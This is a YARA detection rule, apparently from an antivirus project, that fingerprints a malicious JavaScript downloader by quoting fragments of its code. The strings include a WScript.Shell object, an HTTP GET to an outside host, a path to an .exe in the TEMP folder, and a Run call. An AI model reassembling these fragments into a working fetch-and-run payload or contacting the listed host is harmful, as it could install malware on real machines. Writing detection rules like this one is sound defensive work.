rule sig_20160330_ac40a7708c2d21bd231d66ab875bf513 {
  meta:
    description = "datamaliciousorder - file 20160330_ac40a7708c2d21bd231d66ab875bf513.js"
    author      = "HydraDragonAntivirus"
    reference   = "https://github.com/HydraDragonAntivirus"
    date        = "2026-04-26"
    hash1       = "434e38d8fe971050bef49119a773b5138310037997bfd5c36921ee652ce6e08a"

  strings:
    $s1  = "var _Z1 = function _GU() {return WScript[_E0](\"WScript\"+\".Shell\");}(), _H = 11;" fullword ascii
    $s2  = "function _ZX(_E2, _HE){_AY = _AY * 1; return _E2 - _HE;};" fullword ascii
    $s3  = "if (_A[\"readystate\"] < 2 * 2) continue;" fullword ascii
    $s4  = "function _RN() {return _Z1[\"ExpandEnvironmentStrings\"](\"%TE\"+\"MP%/\") + \"PCVHddIggYv.ex\" + \"e\";};" fullword ascii
    $s5  = "function _I(){return _QY + \"\";};" fullword ascii
    $s6  = "_A[_UA](\"GET\", \"http://topcarshop.ir/m1kas\", false);" fullword ascii
    $s7  = "function _QV() {return ((_CZ == true) && (_CZ == _B0)) ? 1 : _AY;};" fullword ascii
    $s8  = "function _E(_LY){_Z1[\"Run\"](_LY, _AY, _AY);};" fullword ascii
    $s9  = " while (_Z0){" fullword ascii
    $s10 = "function _O()" fullword ascii
    $s11 = "function _Z(){return 22;};" fullword ascii
    $s12 = "function _N(){return _E0;};" fullword ascii
    $s13 = "var _UF = new this[\"Date\"]();" fullword ascii
    $s14 = "function _OY(_N0) {var _C = (1, 2, 3, 4, 5, _N0); return _C;};" fullword ascii
    $s15 = "return _ZX(_GU0, _W);" fullword ascii
    $s16 = "var _B0 = false;" fullword ascii
    $s17 = "_B0 = true; " fullword ascii
    $s18 = "var _CZ = false;" fullword ascii
    $s19 = "var _JO = false;" fullword ascii
    $s20 = "_CZ = true; " fullword ascii

  condition:
    uint16(0) == 0x6176 and
    8 of them
}